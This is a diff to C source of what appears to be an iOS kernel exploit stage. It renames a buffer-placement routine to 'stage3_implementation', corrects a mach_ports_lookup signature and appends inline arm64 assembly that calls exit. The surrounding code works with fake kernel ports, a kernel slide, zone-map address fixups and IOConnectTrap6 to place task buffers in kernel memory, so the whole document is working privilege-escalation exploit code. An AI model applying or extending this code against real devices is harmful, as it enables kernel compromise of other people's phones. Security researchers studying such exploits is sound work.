@@ -91,7 +91,7 @@ typedef struct {
 	struct {
 		void (*write) (int fd,void * buf,uint64_t size);
 		kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
-		kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t init_port_count);
+		kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
 		mach_port_name_t (*mach_task_self) ();
 		kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
 		kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
@@ -204,7 +204,7 @@ typedef struct
 #define MACH_MSGH_BITS(remote, local) ((remote) | ((local) << 8))
 
 
-uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
+uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);
 
 #define spelunk(addr) ((zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff))
 #define zonemap_fix_addr(addr) (spelunk(addr) < zm_hdr.start ? spelunk(addr) + 0x100000000 : spelunk(addr))
@@ -418,7 +418,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
     km_task_buf->a.map = kernel_vm_map;
 
     // send both messages into kernel and grab the buffer addresses
-    uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, fake_client,kslide,the_one, our_task_addr, zm_task_buf_msg, ktask_size);
+    uint64_t zm_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client,kslide,the_one, our_task_addr, zm_task_buf_msg, ktask_size);
     if (zm_task_buf_addr == 0x0)
     {
         LOG("failed to get zm_task_buf_addr!");
@@ -427,7 +427,7 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);
 
-    uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, fake_client,kslide,the_one, our_task_addr, km_task_buf_msg, ktask_size);
+    uint64_t km_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client,kslide,the_one, our_task_addr, km_task_buf_msg, ktask_size);
     if (km_task_buf_addr == 0x0)
     {
         LOG("failed to get km_task_buf_addr!");
@@ -545,10 +545,16 @@ out:
 	fakeport->ip_bits = 0x0;
     fakeport->ip_kobject = 0x0;
 	offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);
+
+	__asm__(
+			"movz x0, 0x0\n"
+			"movz x16, 0x1\n"
+			"svc 0x80"
+			);
 }
 
 // kinda messy function signature
-uint64_t send_buffer_to_kernel_and_find(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
 {
     kern_return_t ret;
 
